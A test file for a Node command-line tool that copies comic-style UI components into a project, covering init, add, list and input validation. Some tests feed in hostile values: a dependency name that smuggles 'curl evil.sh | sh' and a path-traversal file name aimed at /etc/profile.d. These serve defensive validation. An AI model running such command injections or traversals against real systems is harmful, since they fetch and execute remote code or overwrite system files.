import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

const cli = require("../bin/c-comic.js");

const root = path.resolve(__dirname, "..");
let cwd: string;

beforeEach(() => {
  process.env.C_COMIC_SKIP_INSTALL = "1";
  cwd = fs.mkdtempSync(path.join(os.tmpdir(), "c-comic-cli-"));
});

afterEach(() => {
  delete process.env.C_COMIC_SKIP_INSTALL;
  fs.rmSync(cwd, { recursive: true, force: true });
});

describe("c-comic CLI", () => {
  it("is executable and declared as the package bin", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(root, "package.json"), "utf8"));
    expect(pkg.bin["c-comic"]).toBe("bin/c-comic.js");
    expect(fs.readFileSync(path.join(root, "bin", "c-comic.js"), "utf8")).toMatch(
      /^#!\/usr\/bin\/env node/,
    );
  });

  it("init writes lib/utils.ts", async () => {
    expect(await cli.main(["init"], cwd)).toBe(0);
    const utils = fs.readFileSync(path.join(cwd, "lib", "utils.ts"), "utf8");
    expect(utils).toContain("export function cn");
    expect(utils).toContain("tailwind-merge");
  });

  it("add copies a component into components/comic-ui", async () => {
    expect(await cli.main(["add", "button"], cwd)).toBe(0);
    const written = fs.readFileSync(
      path.join(cwd, "components", "comic-ui", "button.tsx"),
      "utf8",
    );
    expect(written).toContain("export");
    expect(written).toContain("@/lib/utils");
  });

  it("add pulls in components that the requested one depends on", async () => {
    expect(await cli.main(["add", "rich-card"], cwd)).toBe(0);
    const dir = path.join(cwd, "components", "comic-ui");
    expect(fs.existsSync(path.join(dir, "rich-card.tsx"))).toBe(true);
    expect(fs.existsSync(path.join(dir, "button.tsx"))).toBe(true);
  });

  it("fails clearly for an unknown component", async () => {
    const registry = await cli.loadRegistry();
    expect(() => cli.collect(registry, ["does-not-exist"])).toThrow(/not found/);
  });

  it("returns a non-zero exit code for unknown commands", async () => {
    expect(await cli.main(["nope"], cwd)).toBe(1);
    expect(await cli.main(["add"], cwd)).toBe(1);
    expect(await cli.main(["--help"], cwd)).toBe(0);
  });

  it("lists every registry component", async () => {
    expect(await cli.main(["list"], cwd)).toBe(0);
  });

  it("never fetches the registry over the network", () => {
    const source = fs.readFileSync(path.join(root, "bin", "c-comic.js"), "utf8");
    expect(source).not.toMatch(/fetch\(|https?:\/\//);
    expect(source).not.toMatch(/execSync/);
  });

  it("rejects registry entries that would write outside components/comic-ui", () => {
    expect(() =>
      cli.validateEntry("evil", {
        name: "evil",
        files: [{ name: "../../../etc/profile.d/evil.ts", content: "" }],
      }),
    ).toThrow(/unsafe file name/);
    expect(() =>
      cli.validateEntry("evil", { name: "evil", files: [{ name: "run.sh", content: "" }] }),
    ).toThrow(/unsafe file name/);
  });

  it("rejects registry dependencies that are not plain package names", () => {
    expect(() =>
      cli.validateEntry("evil", {
        name: "evil",
        files: [{ name: "evil.tsx", content: "" }],
        dependencies: ["clsx; curl evil.sh | sh"],
      }),
    ).toThrow(/unsafe dependency name/);
    expect(() =>
      cli.validateEntry("evil", {
        name: "evil",
        files: [{ name: "evil.tsx", content: "" }],
        registryDependencies: ["../button"],
      }),
    ).toThrow(/unsafe component dependency/);
  });

  it("accepts every entry in the bundled registry", async () => {
    await expect(cli.loadRegistry()).resolves.toBeTypeOf("object");
  });
});
